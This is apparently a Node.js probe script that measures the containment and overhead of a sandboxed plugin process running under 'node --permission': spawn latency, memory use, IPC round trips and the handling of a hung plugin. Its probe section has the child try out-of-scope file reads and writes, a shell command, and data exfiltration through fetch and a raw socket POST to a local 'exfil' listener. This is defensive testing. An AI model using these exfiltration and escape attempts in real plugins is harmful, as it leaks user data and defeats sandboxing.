// R2.5 plugin probe 6 — what a third-party plugin's containment actually costs and what it holds.
//
// The plugin child runs under the only configuration round 2 measured as real containment:
//   node --permission (no --allow-addons) --allow-fs-read=<plugin dir>
// Everything below is measured against that child: what it cannot do, what it still can do,
// what it costs in RSS and spawn latency, and what an RPC round trip costs through it.
//
// Run: SK_PROBE_DEPS=<dir with better-sqlite3> node scripts/debate/r2-plugin/p6_trust.mjs
import { spawn, spawnSync } from 'node:child_process';
import { createServer } from 'node:http';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';

const DEPS = process.env.SK_PROBE_DEPS ||
  path.join(os.homedir(), '.hermes/profiles/ceo/cache/scratch/probe/sql');
const WORK = process.env.SK_PLUGIN_WORK ||
  path.join(os.homedir(), '.hermes/profiles/ceo/cache/scratch/pluginprobe/work');
const PLUGIN_DIR = path.join(WORK, 'plugins', 'contact');
fs.mkdirSync(PLUGIN_DIR, { recursive: true });

// ---------------------------------------------------------------- the plugin's own module
fs.writeFileSync(path.join(PLUGIN_DIR, 'index.mjs'), `
export const id = 'contact';
export async function handle(req) {
  // a real handler would validate and format; this one echoes so the measurement is the RPC.
  return { status: 200, body: { ok: true, echo: req.body ?? null } };
}
`);

const CHILD = path.join(WORK, 'plugin-child.mjs');
fs.writeFileSync(CHILD, `
import fs from 'node:fs';
import { createRequire } from 'node:module';
const require = createRequire(${JSON.stringify(DEPS + '/')});
const mode = process.argv[2];
const report = (k, v) => process.stdout.write(JSON.stringify({ k, v }) + '\\n');

if (mode === '--probe') {
  const attempt = async (label, fn) => {
    try { const v = await fn(); report(label, 'ALLOWED ' + String(v).slice(0, 40)); }
    catch (e) { report(label, 'DENIED ' + (e.code || e.name)); }
  };
  const outside = process.argv[3];
  await attempt('fs.read outside', () => fs.readFileSync(outside, 'utf8').length);
  await attempt('fs.read own dir', () => fs.readFileSync(process.argv[7], 'utf8').length);
  await attempt('fs.write scratch', () => { fs.writeFileSync(process.argv[4], 'x'); return 'wrote'; });
  await attempt('child_process', () => require('node:child_process').execSync('id').toString().trim());
  await attempt('import better-sqlite3', () => require('better-sqlite3'));
  await attempt('open db via better-sqlite3', () => { const D = require('better-sqlite3'); const d = new D(outside); return d.prepare('select 1 x').get().x; });
  await attempt('fetch 127.0.0.1:EXFIL', async () => { const r = await fetch(process.argv[5]); return r.status; });
  await attempt('net.connect + raw HTTP POST', async () => {
    const net = require('node:net');
    return await new Promise((res, rej) => {
      const s = net.connect(Number(process.argv[6]), '127.0.0.1', () => {
        const CRLF = String.fromCharCode(13, 10);
        s.write(['POST /exfil?via=net HTTP/1.1', 'Host: 127.0.0.1', 'Content-Length: 9',
                 'Connection: close', '', 'tenant=acme'].join(CRLF));
      });
      let buf = '';
      s.on('data', (d) => (buf += d));
      s.on('end', () => { s.destroy(); res('HTTP ' + buf.split(' ')[1]); });
      s.on('error', rej); setTimeout(() => rej(new Error('timeout')), 1500);
    });
  });
  await attempt('worker_threads', async () => { const { Worker } = require('node:worker_threads'); const w = new Worker('0', { eval: true }); await w.terminate(); return 'spawned'; });
  report('rss_after_load_MB', (process.memoryUsage().rss / 1048576).toFixed(1));
  process.exit(0);
}

if (mode === '--serve') {
  const mod = await import(new URL('./plugins/contact/index.mjs', 'file://' + ${JSON.stringify(WORK)} + '/').href);
  report('ready', (process.memoryUsage().rss / 1048576).toFixed(1));
  process.on('message', async (msg) => {
    const t = process.hrtime.bigint();
    const out = await mod.handle(msg);
    out.us = Number(process.hrtime.bigint() - t) / 1000;
    out.__id = msg.__id;
    process.send(out);
  });
}

if (mode === '--sleep') {
  report('ready', 'hung');
  setInterval(() => {}, 1000);   // alive, never answers
}

if (mode === '--mem') {
  await import(new URL('./plugins/contact/index.mjs', 'file://' + ${JSON.stringify(WORK)} + '/').href);
  report('rss_MB', (process.memoryUsage().rss / 1048576).toFixed(1));
  const big = Buffer.alloc(4 * 1024 * 1024, 1);
  report('rss_after_4MB_MB', (process.memoryUsage().rss / 1048576 + big.length / 1048576).toFixed(1));
  process.exit(0);
}
`);

const perms = [`--permission`, `--allow-fs-read=${PLUGIN_DIR}`, `--allow-fs-read=${CHILD}`,
  `--allow-fs-read=${DEPS}`];
const line = (s) => console.log(s);

// ---------------------------------------------------------------- A. what the child can still do
line('A. inside `node --permission`, no --allow-addons');
const exfilHits = [];
const exfil = createServer((req, res) => { exfilHits.push(req.url); res.end('stolen'); });
await new Promise((r) => exfil.listen(0, '127.0.0.1', r));
const exfilPort = exfil.address().port;
const scratchWrite = path.join(WORK, 'child-wrote-here.txt');
if (fs.existsSync(scratchWrite)) fs.rmSync(scratchWrite);
// async on purpose: spawnSync blocks this process's event loop, and the exfil server lives in it.
const probe = await new Promise((resolve) => {
  const k = spawn(process.execPath, [...perms, CHILD, '--probe',
    path.join(WORK, 'endpoint.db'),    // a real DB file outside the plugin dir
    scratchWrite,
    `http://127.0.0.1:${exfilPort}/exfil?plugin=contact`,
    String(exfilPort),
    path.join(PLUGIN_DIR, 'index.mjs')], { stdio: ['ignore', 'pipe', 'pipe'] });
  let out = '', err = '';
  k.stdout.on('data', (b) => (out += b));
  k.stderr.on('data', (b) => (err += b));
  k.on('close', () => resolve({ stdout: out, stderr: err }));
});
for (const l of String(probe.stdout).trim().split('\n')) {
  if (!l.trim()) continue;
  try { const { k, v } = JSON.parse(l); line(`   ${k.padEnd(28)} ${v}`); } catch { line('   ' + l); }
}
if (probe.stderr.trim()) line('   stderr: ' + probe.stderr.trim().split('\n')[0]);
line(`   exfil server hits: ${exfilHits.length}${exfilHits.length ? ' ' + JSON.stringify(exfilHits) : ''}`);
line(`   file written outside the plugin dir: ${fs.existsSync(scratchWrite)}`);
exfil.close();

// ---------------------------------------------------------------- B. spawn latency and RSS
line('\nB. cost of one plugin process (10 spawns, cold)');
const spawnMs = [];
for (let i = 0; i < 10; i++) {
  const t = process.hrtime.bigint();
  const r = spawnSync(process.execPath, [...perms, CHILD, '--mem'], { encoding: 'utf8' });
  spawnMs.push(Number(process.hrtime.bigint() - t) / 1e6);
  if (i === 0) {
    for (const l of String(r.stdout).trim().split('\n')) {
      const { k, v } = JSON.parse(l);
      line(`   ${k.padEnd(26)} ${v} MB`);
    }
  }
}
spawnMs.sort((a, b) => a - b);
line(`   spawn -> module loaded -> exit: median ${spawnMs[5].toFixed(1)} ms  min ${spawnMs[0].toFixed(1)}  max ${spawnMs[9].toFixed(1)}`);
const timed = spawnSync('/usr/bin/time', ['-l', process.execPath, ...perms, CHILD, '--mem'], { encoding: 'utf8' });
const peak = /(\d+)\s+maximum resident set size/.exec(String(timed.stderr));
line(`   peak RSS (kernel): ${peak ? (Number(peak[1]) / 1048576).toFixed(1) + ' MB' : 'unparsed'}`);

// ---------------------------------------------------------------- C. RPC round trip
line('\nC. RPC round trip over child_process IPC (JSON, 1 KB response)');
const kid = spawn(process.execPath, [...perms, CHILD, '--serve'], { stdio: ['ignore', 'pipe', 'pipe', 'ipc'] });
let ready = null;
const rpc = new Map();
let seq = 0;
kid.on('message', (m) => {
  if (m && m.k) { ready = m; return; }
  const cb = rpc.get(m.__id); if (cb) { rpc.delete(m.__id); cb(m); }
});
kid.stdout.on('data', (b) => {
  for (const l of String(b).split('\n').filter(Boolean)) {
    try { const m = JSON.parse(l); if (m.k) ready = m; } catch { /* ignore */ }
  }
});
const call = (payload) => new Promise((resolve, reject) => {
  const id = ++seq;
  rpc.set(id, resolve);
  kid.send({ __id: id, body: payload });
  setTimeout(() => { rpc.delete(id); reject(new Error('timeout')); }, 2000);
});
await new Promise((r) => setTimeout(r, 400));
line(`   child ready: ${JSON.stringify(ready)}`);
const N = 2000;
const lat = [];
const t0 = process.hrtime.bigint();
for (let i = 0; i < N; i++) {
  const a = process.hrtime.bigint();
  await call({ n: i, pad: 'x'.repeat(200) });
  lat.push(Number(process.hrtime.bigint() - a) / 1000);
}
const total = Number(process.hrtime.bigint() - t0) / 1e6;
lat.sort((a, b) => a - b);
line(`   ${N} calls in ${total.toFixed(0)} ms = ${(N / (total / 1000)).toFixed(0)} calls/s`);
line(`   per call: p50 ${lat[Math.floor(N * 0.5)].toFixed(0)} us  p95 ${lat[Math.floor(N * 0.95)].toFixed(0)} us  max ${lat[N - 1].toFixed(0)} us`);

// ---------------------------------------------------------------- D. a hung plugin
line('\nD. a plugin that never answers: 250 ms deadline, 50 concurrent public requests');
const hung = spawn(process.execPath, [...perms, CHILD, '--sleep'], { stdio: ['ignore', 'pipe', 'pipe', 'ipc'] });
const pending = new Map();
hung.on('message', () => {});
await new Promise((r) => setTimeout(r, 300));

let loopMax = 0;
let last = process.hrtime.bigint();
const sampler = setInterval(() => {
  const now = process.hrtime.bigint();
  loopMax = Math.max(loopMax, Number(now - last) / 1e6 - 10);
  last = now;
}, 10);

const DEADLINE = 250;
async function handler() {
  const t = process.hrtime.bigint();
  const answer = await new Promise((resolve) => {
    const id = ++seq;
    pending.set(id, resolve);
    try { hung.send({ __id: id }); } catch { resolve({ status: 503, code: 'PL_E_UNAVAILABLE' }); }
    setTimeout(() => { pending.delete(id); resolve({ status: 503, code: 'PL_E_UNAVAILABLE' }); }, DEADLINE);
  });
  return { ...answer, ms: Number(process.hrtime.bigint() - t) / 1e6 };
}
const results = await Promise.all(Array.from({ length: 50 }, handler));
clearInterval(sampler);
const ms = results.map((r) => r.ms).sort((a, b) => a - b);
line(`   statuses: ${JSON.stringify(results.reduce((a, r) => (a[r.status] = (a[r.status] || 0) + 1, a), {}))}`);
line(`   answered in p50 ${ms[25].toFixed(0)} ms  max ${ms[49].toFixed(0)} ms   (deadline ${DEADLINE} ms)`);
line(`   worst event-loop gap during the burst: ${loopMax.toFixed(1)} ms`);
hung.kill('SIGKILL');
kid.kill('SIGKILL');
line(`   a killed child is respawned by the host; the request that was in flight already got 503`);

// ---------------------------------------------------------------- E. the app -> runner hop
line('\nE. the extra hop a containerised runner costs: unix socket, JSON lines, 2000 round trips');
{
  const { createServer: netServer, connect } = await import('node:net');
  const sock = path.join(WORK, 'runner.sock');
  if (fs.existsSync(sock)) fs.rmSync(sock);
  const srv = netServer((c) => {
    let buf = '';
    c.on('data', (d) => {
      buf += d;
      let i;
      while ((i = buf.indexOf('\n')) >= 0) {
        const msg = buf.slice(0, i); buf = buf.slice(i + 1);
        const req = JSON.parse(msg);
        c.write(JSON.stringify({ __id: req.__id, status: 200, body: { ok: true, echo: req.body ?? null } }) + '\n');
      }
    });
  });
  await new Promise((r) => srv.listen(sock, r));
  const c = await new Promise((r) => { const s = connect(sock, () => r(s)); });
  let buf = '';
  const waiters = new Map();
  c.on('data', (d) => {
    buf += d; let i;
    while ((i = buf.indexOf('\n')) >= 0) {
      const m = JSON.parse(buf.slice(0, i)); buf = buf.slice(i + 1);
      const w = waiters.get(m.__id); if (w) { waiters.delete(m.__id); w(m); }
    }
  });
  const hop = (payload) => new Promise((res) => {
    const id = ++seq; waiters.set(id, res);
    c.write(JSON.stringify({ __id: id, body: payload }) + '\n');
  });
  const H = 2000; const hl = [];
  const t = process.hrtime.bigint();
  for (let i = 0; i < H; i++) {
    const a = process.hrtime.bigint();
    await hop({ n: i, pad: 'x'.repeat(200) });
    hl.push(Number(process.hrtime.bigint() - a) / 1000);
  }
  const tot = Number(process.hrtime.bigint() - t) / 1e6;
  hl.sort((a, b) => a - b);
  line(`   ${H} calls in ${tot.toFixed(0)} ms = ${(H / (tot / 1000)).toFixed(0)} calls/s   p50 ${hl[H / 2 | 0].toFixed(0)} us  p95 ${hl[Math.floor(H * 0.95)].toFixed(0)} us`);
  line(`   two hops (socket + child IPC) therefore ~${(hl[H / 2 | 0] + 22).toFixed(0)} us at p50`);
  c.destroy(); srv.close();
}
